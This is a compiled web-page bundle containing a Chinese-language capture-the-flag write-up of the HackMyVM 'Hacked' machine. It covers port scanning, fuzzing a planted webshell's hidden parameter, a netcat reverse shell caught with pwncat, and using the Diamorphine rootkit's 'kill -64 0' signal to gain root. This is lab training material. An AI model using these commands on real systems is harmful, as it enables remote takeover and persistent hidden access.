"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4802],{74285:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>d,contentTitle:()=>s,default:()=>h,frontMatter:()=>i,metadata:()=>c,toc:()=>l});var t=a(85893),r=a(11151);const i={},s="Hacked",c={id:"HackMyVM/Machines/Hacked/index",title:"Hacked",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Hacked/index.md",sourceDirName:"HackMyVM/Machines/Hacked",slug:"/HackMyVM/Machines/Hacked/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Hacked/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Hacked/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Gigachad",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Gigachad/"},next:{title:"Hash",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Hash/"}},d={},l=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"User - www-data",id:"user---www-data",level:2},{value:"Diamorphine LKM rootkit",id:"diamorphine-lkm-rootkit",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"flag - root",id:"flag---root",level:3}];function o(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,r.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"hacked",children:"Hacked"}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-11-15"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 2ee68492e2ef713a5216abe792aec766"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 57"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 57"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and Fun. Tested on Virtualbox."})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.116\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.116\nHost is up (0.00042s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 8d:75:44:05:5f:f8:4f:ac:a1:33:fa:84:03:db:6f:94 (RSA)\n|   256 5a:b6:c6:9d:a9:15:42:74:4c:7a:f9:dd:67:ae:75:0e (ECDSA)\n|_  256 05:97:3c:74:bd:cf:8d:80:87:05:26:64:7f:d9:3d:c3 (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: Site doesn't have a title (text/html).\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"[11:08:42] 200 -   16B  - /index.html\n[11:08:57] 200 -   16B  - /robots.txt\n[11:09:00] 302 -   62B  - /simple-backdoor.php  ->  /\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/secretnote.txt"',children:"[X] Enumeration\n[X] Exploitation\n[X] Privesc\n[X] Maintaining Access.\n |__> Webshell installed.\n |__> Root shell created.\n\n-h4x0r\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/simple-backdoor.php"',children:"I modified this webshell to only execute my secret parameter.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u5bf9 webshell \u7684\u53c2\u6570\u8fdb\u884c fuzz"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title=""',children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.116/simple-backdoor.php?FUZZ=id -fs 62\n......\n[Status: 302, Size: 115, Words: 12, Lines: 2, Duration: 28ms]\n    * FUZZ: secret\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ curl http://192.168.56.116/simple-backdoor.php?secret=whoami\nI modified this webshell to only execute my secret parameter.\nwww-data\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"# curl http://192.168.56.116/simple-backdoor.php?secret=nc+192.168.56.102+9999+-e+/bin/bash\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 9999\n[11:51:03] Welcome to pwncat \ud83d\udc08!\n[11:51:10] received connection from 192.168.56.116:41060\n[11:51:11] 192.168.56.116:41060: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@hacked:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,t.jsx)(n.h3,{id:"diamorphine-lkm-rootkit",children:"Diamorphine LKM rootkit"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://github.com/m0nad/Diamorphine",children:"m0nad/Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@hacked:/tmp/Diamorphine$ ls -lh\ntotal 32K\n-rw-r--r-- 1 www-data www-data 1.5K Feb 18 23:05 LICENSE.txt\n-rw-r--r-- 1 www-data www-data  190 Feb 18 23:05 Makefile\n-rw-r--r-- 1 www-data www-data 1.7K Feb 18 23:05 README.md\n-rw-r--r-- 1 www-data www-data  11K Feb 18 23:05 diamorphine.c\n-rw-r--r-- 1 www-data www-data  642 Feb 18 23:05 diamorphine.h\n-rw-r--r-- 1 www-data www-data   39 Feb 18 23:09 modules.order\n"})}),"\n",(0,t.jsxs)(n.admonition,{type:"warning",children:[(0,t.jsxs)(n.p,{children:["\u7531\u4e8e\u9776\u673a\u4e0a\u7684 gcc \u7f16\u8bd1\u73af\u5883\u6709\u95ee\u9898\uff0c\u5176\u4e2d ",(0,t.jsx)(n.code,{children:"cc1"})," \u7a0b\u5e8f\u4e0d\u5b58\u5728\u4e8e ",(0,t.jsx)(n.code,{children:"PATH"})," \u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u6240\u4ee5\u9700\u8981\u8fdb\u884c\u4e00\u5b9a\u7684 patch"]}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@hacked:/tmp/Diamorphine$ ln -s /usr/lib/gcc/x86_64-linux-gnu/8/cc1 /tmp/Diamorphine/cc1\n(remote) www-data@hacked:/tmp/Diamorphine$ export PATH=/tmp/Diamorphine:$PATH\n"})})]}),"\n",(0,t.jsx)(n.p,{children:"\u7136\u540e\u5f00\u59cb\u7f16\u8bd1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@hacked:/tmp/Diamorphine$ make\nmake -C /lib/modules/4.19.0-12-amd64/build M=/tmp/Diamorphine modules\nmake[1]: Entering directory '/usr/src/linux-headers-4.19.0-12-amd64'\n  CC [M]  /tmp/Diamorphine/diamorphine.o\n  Building modules, stage 2.\n  MODPOST 1 modules\n  CC      /tmp/Diamorphine/diamorphine.mod.o\n  LD [M]  /tmp/Diamorphine/diamorphine.ko\nmake[1]: Leaving directory '/usr/src/linux-headers-4.19.0-12-amd64'\n"})}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsx)(n.p,{children:"\u5931\u8bef\u4e86\uff0c\u5fd8\u8bb0\u6ca1\u6709 root \u6743\u9650\u6ca1\u529e\u6cd5\u52a0\u8f7d\u6a21\u5757\u5230\u5185\u6838\u3002\u3002\u3002"})}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a\u5df2\u7ecf\u90e8\u7f72\u8fc7 Diamorphine"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@hacked:/tmp$ kill -63 0\n(remote) www-data@hacked:/tmp$ lsmod | grep diamorphine\ndiamorphine            16384  0\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@hacked:/tmp$ kill -64 0\n(remote) root@hacked:/tmp$ whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) root@hacked:/home/h4x0r$ cat user.txt\nHMVimthabesthacker\n"})}),"\n",(0,t.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) root@hacked:/root$ cat root.txt\nHMVhackingthehacker\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},11151:(e,n,a)=>{a.d(n,{Z:()=>c,a:()=>s});var t=a(67294);const r={},i=t.createContext(r);function s(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:s(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);